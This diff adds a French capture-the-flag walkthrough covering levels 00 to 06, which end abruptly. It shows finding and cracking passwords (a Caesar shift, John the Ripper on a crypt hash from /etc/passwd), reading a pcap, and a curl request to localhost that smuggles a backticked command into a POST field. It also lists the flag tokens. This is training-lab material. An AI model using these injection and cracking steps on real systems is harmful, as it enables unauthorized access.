@@ -1,0 +1,56 @@
+
+/// LEVEL 00
+Vu que je n'ai aucun indice a ma disposition, je me lance innocement a la recherche de fichiers appartenant au group "flag00", et il y en a un !
+
+find / -group flag00 2>/dev/null	=	/usr/sbin/john
+cat /usr/sbin/john					=	cdiiddwpgswtgt
+
+Le mot de passe fonctionne pas alors je pose ca sur dcode et un dechiffrement de code cesar de 15 me donne "nottoohardhere" ce qui a l'air credible
+
+de la, bash>su flag00 puis bash>getflag:
+"Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias"
+
+/// LEVEL 01
+Un simple cat /etc/passwd montre que le mot de passe de flag01 est present sous forme crypt
+(Les autres ont un "x" pour montre qu'ils sont en securite dans /etc/shadow, fichier sur lequel nous n'avons aucune permission)
+
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+Il suffit d'utiliser l'outil "John The Ripper".
+On met la ligne precedente dans un fichier texte puis
+./john -format=crypt content/pass.txt
+./john --show content/pass.txt
+
+Et cela nous donnes:
+"abcdefg"
+
+Plus qu'a faire getflag
+f2av5il02puano7naaf6adaaf
+
+/// LEVEL 02
+
+tcpick -C -yU -r level02.pcap
+
+ft_waNDReL0L
+
+kooda2puivaav1idi4f57q8iq
+
+/// LEVEL 03
+
+remplacer echo
+
+qi0maab88jeaj46qoumi7maus
+
+// LEVEL 04
+
+curl -d "x=\`getflag\`" -X POST http://localhost:4747
+
+ne2searoevaevoem4ov4ar8ap
+
+// LEVEL 05
+
+pam_mail + crontab
+
+viuaaale9huek52boumoomioc
+
+// LEVEL 06
